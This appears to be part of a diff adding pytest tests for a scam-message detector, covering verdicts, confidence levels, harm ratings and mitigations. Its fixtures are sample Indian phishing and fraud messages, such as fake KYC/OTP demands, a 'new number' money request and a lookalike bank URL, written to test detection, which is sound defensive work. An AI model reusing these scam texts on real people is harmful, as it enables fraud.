+    sig = RSignal("official_asks_upi_payment", 0.8, "x")   # mapped to impersonation AND financial manipulation
+    cats = gather([sig], None)
+    assert sum(c.independent for c in cats) == 1
+
+
+def test_model_agreement_corroborates_but_is_not_a_second_tactic():
+    sig = RSignal("job_task_fee", 0.85, "x")
+    weak_model = r_assess("Earn Rs 150 for every hotel review on Google Maps today", [sig], 0.80)
+    strong_model = r_assess("Earn Rs 150 for every hotel review on Google Maps today", [sig], 0.92)
+    assert weak_model.verdict == CAREFUL
+    assert strong_model.verdict == SCAM and "confirmed by the ML model" in strong_model.detail
+
+
+def test_less_reliable_sources_lower_confidence_not_the_verdict():
+    english = analyze("Your bank account will be blocked today. Update KYC now and share the OTP with us.")
+    hindi = analyze("आपका बैंक खाता आज बंद हो जाएगा। तुरंत केवाईसी अपडेट करें और ओटीपी बताएं।")
+    assert english.verdict == hindi.verdict == SCAM
+    order = ["Low", "Medium", "High"]
+    assert order.index(hindi.report.confidence) < order.index(english.report.confidence)
+
+
+def test_contradicting_evidence_lowers_confidence_but_not_the_warning():
+    r = analyze("SBI: Your card ending 4521 is blocked due to 3 wrong PINs. Call 1800 1234 or visit a branch.")
+    assert r.verdict == CAREFUL and r.report.confidence == "Low"
+    assert any("toll-free" in m for m in r.report.mitigations)
+    assert r.report.outcome["headline"].startswith("Some warning signs, but also signs it may be genuine")
+
+
+def test_mitigations_never_cancel_a_strong_red_flag():
+    r = analyze("SBI: share the OTP you received with our executive to stop the debit. Details at https://www.onlinesbi.sbi")
+    assert r.verdict == SCAM
+    assert any("official websites" in m for m in r.report.mitigations)
+
+
+def test_harm_is_separate_from_likelihood():
+    small = analyze("Hi beta new number, send Rs 200 urgently")
+    big = analyze("Hi beta new number, send Rs 2,00,000 urgently")
+    assert small.verdict == big.verdict == SCAM
+    assert small.report.harm["level"] == "Moderate" and big.report.harm["level"] == "Severe"
+
+
+@pytest.mark.parametrize("text,headline", [
+    ("Dear customer, your SBI account will be suspended today. Verify at https://sbi-kyc.example.xyz and share "
+     "the OTP you receive.", "Very likely a scam."),                                    # high risk, high confidence
+    ("SBI: Your card ending 4521 is blocked due to 3 wrong PINs. Call 1800 1234 or visit a branch.",
+     "Some warning signs, but also signs it may be genuine."),                           # warning, low confidence
+    ("call me", "We can't tell from this."),                                             # insufficient evidence
+    ("Are we still meeting for lunch on Sunday? I'll book the table at the usual place.", "No warning signs found."),
+])
+def test_different_combinations_get_different_outcomes(text, headline):
+    assert analyze(text).report.outcome["headline"] == headline
+
+
+def test_high_risk_low_confidence_gets_verify_first_advice():
+    from scamshield.evidence import outcome
+    o = outcome(SCAM, "Low", {"level": "Severe"})
+    assert o["headline"].startswith("Strong warning signs, but we're not certain")
+    assert "until you've checked" in o["action"] and "severe" in o["action"]
+
+
+def test_reputation_results_say_how_fresh_they_are(monkeypatch):
+    _fake_sources(monkeypatch, "not listed")
+    r = urlintel.analyse("https://some-random-blog.com/recipes", online=True)
+    assert any("checked just now" in f.text for f in r.all_findings())
+    r = urlintel.analyse("https://some-random-blog.com/recipes", online=True)     # second time: from the cache
+    assert any("checked" in f.text for f in r.all_findings())
+
+
+def test_risk_score_is_not_the_confidence():
+    """Identical evidence (so identical risk score), different confidence: one has contradicting evidence."""
+    from scamshield.evidence import assess_confidence
+    from scamshield.preprocess import detect_language
+    text = "Your account will be blocked today. Call our helpline to fix it before midnight please."
+    sigs = [RSignal("threat", 0.7, "x"), RSignal("customer_care_callback", 0.55, "y")]
+    plain = r_assess(text, sigs, None)
+    contradicted = r_assess(text, sigs, None, mitigations=["It gives a toll-free helpline."])
+    assert plain.risk_score == contradicted.risk_score and plain.verdict == contradicted.verdict
+    lang = detect_language(text)
+    c1, _ = assess_confidence(plain, lang, 14, "text", None)
+    c2, _ = assess_confidence(contradicted, lang, 14, "text", None)
+    assert c1 != c2
